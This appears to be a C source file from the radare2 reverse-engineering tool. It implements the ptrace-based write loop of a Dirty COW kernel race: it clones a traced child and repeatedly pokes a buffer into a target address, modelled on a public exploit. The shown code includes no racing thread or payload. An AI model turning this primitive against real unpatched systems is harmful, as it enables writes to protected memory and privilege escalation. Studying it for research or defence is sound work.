/* radare - LGPL - Copyright 2016 - pancake@nowsecure.com */
/* inspired by https://github.com/scumjr/dirtycow-vdso */

#include "os-barrier.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <linux/sched.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>

static char child_stack[8192];

static int debuggee(void *arg_) {
#if 0
	if (prctl (PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1)
		err (1, "prctl(PR_SET_PDEATHSIG)");
#endif

	if (ptrace (PTRACE_TRACEME, 0, NULL, NULL) == -1) {
		err (1, "ptrace(PTRACE_TRACEME)");
	}
	kill (getpid (), SIGSTOP);

	return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
	unsigned long value;
	const unsigned char *s = src;
	unsigned char *d = dest;

	while (n >= sizeof(long)) {
		memcpy (&value, s, sizeof(value));
		if (ptrace (PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}

		n -= sizeof (long);
		d += sizeof (long);
		s += sizeof (long);
	}

	if (n > 0) {
		d -= sizeof (long) - n;

		errno = 0;
		value = ptrace (PTRACE_PEEKTEXT, pid, d, NULL);
		if (value == -1 && errno != 0) {
			warn ("ptrace(PTRACE_PEEKTEXT)");
			return -1;
		}

		memcpy ((unsigned char *)&value + sizeof(value) - n, s, n);
		if (ptrace (PTRACE_POKETEXT, pid, d, value) == -1) {
			warn ("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}
	return 0;
}

typedef struct dcow_user_t  {
	void *addr;
	const unsigned char *buf;
	int len;
} DCowUser;

static void *ptraceThread(void *arg_) {
	int i, flags, ret2, status;
	DCowUser *arg;
	pid_t pid;
	void *ret = &pid;

	arg = (struct dcow_user_t *)arg_;

	flags = CLONE_VM | CLONE_PTRACE;
	pid = clone (debuggee, child_stack + sizeof (child_stack) - 8, flags, arg);
	if (pid == -1) {
		warn ("clone");
		return NULL;
	}

	if (waitpid (pid, &status, __WALL) == -1) {
		warn ("waitpid");
		return NULL;
	}

	for (i = 0; i < LOOPS; i++) {
		ptrace_memcpy (pid, arg->addr, arg->buf, arg->len);
	}
	if (ptrace (PTRACE_CONT, pid, NULL, NULL) == -1) {
		warn ("ptrace(PTRACE_CONT)");
	}

	if (waitpid (pid, NULL, __WALL) == -1) {
		warn ("waitpid");
	}

	return ret;
}
